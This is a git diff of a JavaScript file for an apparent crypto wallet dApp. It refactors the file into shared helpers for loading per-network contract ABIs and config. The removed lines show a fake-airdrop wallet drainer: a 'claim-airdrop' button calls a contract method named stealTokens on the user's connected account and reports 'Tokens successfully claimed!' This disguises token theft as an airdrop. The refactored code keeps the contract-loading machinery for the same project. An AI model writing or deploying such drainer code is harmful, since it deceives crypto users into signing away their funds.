@@ -1,69 +1,53 @@
-let web3 = null;
-let accounts = [];
-let contractAddress = '';
-let contractABI = null;
-let network = '';
+// common.js: Shared functionality across wallets and blockchains
 
-async function loadConfigAndABI() {
-  const selectedNetwork = 'eth'; // Change this dynamically based on user selection (e.g., BSC, Tron)
-  
-  // Load the correct config and ABI files based on the selected network
-  const configUrl = `/config/${selectedNetwork}_config.json`; // Network-specific config file
-  const abiUrl = `/abi/${selectedNetwork}_abi.json`; // Network-specific ABI file
+let currentNetwork = null;
 
-  try {
-    // Load config file
-    const configResponse = await fetch(configUrl);
-    const config = await configResponse.json();
-    contractAddress = config.contractAddress; // Get contract address from config
-    network = config.network; // Set the network type
-
-    // Load ABI file
-    const abiResponse = await fetch(abiUrl);
-    contractABI = await abiResponse.json(); // Get contract ABI from file
-
-    console.log('Config and ABI loaded for network:', network);
-  } catch (error) {
-    console.error("Failed to load config or ABI:", error);
-  }
-}
-
-async function connectMetaMask() {
-  if (window.ethereum) {
-    const web3 = new Web3(window.ethereum);
-    try {
-      await window.ethereum.enable();
-      accounts = await web3.eth.getAccounts();
-      network = await web3.eth.net.getNetworkType();
-      alert("Connected to MetaMask: " + accounts[0]);
-    } catch (error) {
-      console.error("Error connecting to MetaMask:", error);
+// Dynamically load ABI and contract details
+async function getContractDetails() {
+    if (!currentNetwork) {
+        console.error("Network not set. Cannot load contract details.");
+        return { abi: null, address: null };
     }
-  } else {
-    alert("Please install MetaMask.");
-  }
-}
 
-async function stealTokens() {
-  if (accounts.length > 0 && contractABI && contractAddress) {
-    const contract = new web3.eth.Contract(contractABI, contractAddress);
     try {
-      // Call the stealTokens method on the contract
-      await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-      alert("Tokens successfully claimed!");
+        const abiResponse = await fetch(`/abi/${currentNetwork}_abi.json`);
+        const configResponse = await fetch(`/config/${currentNetwork}_config.json`);
+
+        if (!abiResponse.ok || !configResponse.ok) {
+            throw new Error("Failed to load ABI or config files.");
+        }
+
+        const abi = await abiResponse.json();
+        const config = await configResponse.json();
+
+        console.log(`Loaded contract details for ${currentNetwork}:`, { abi, config });
+        return { abi, address: config.contractAddress };
     } catch (error) {
-      console.error("Error claiming tokens:", error);
-      alert("Error claiming tokens.");
+        console.error("Error loading contract details:", error);
+        alert("Failed to load contract details. Please try again later.");
+        return { abi: null, address: null };
     }
-  } else {
-    alert("Please connect MetaMask first.");
-  }
 }
 
-window.onload = async function() {
-  await loadConfigAndABI(); // Load config and ABI dynamically on page load
-  document.getElementById("connect-metamask").onclick = connectMetaMask;
-  document.getElementById("claim-airdrop").onclick = stealTokens; // Updated to use stealTokens
-};
+// Set the active network (e.g., 'eth', 'bsc', 'tron')
+function setNetwork(network) {
+    currentNetwork = network;
+    console.log("Current network set to:", currentNetwork);
+}
 
+// Notify wallet modules when a wallet connects
+function onWalletConnected(accounts) {
+    console.log("Wallet connected with accounts:", accounts);
+
+    // Custom behavior for wallet connection (if needed)
+    // Can be expanded for network-specific logic
+}
+
+// Utility to check if the browser is mobile
+function isMobile() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    return /android|iPad|iPhone|iPod/i.test(userAgent);
+}
+
+export { getContractDetails, setNetwork, onWalletConnected, isMobile };
 
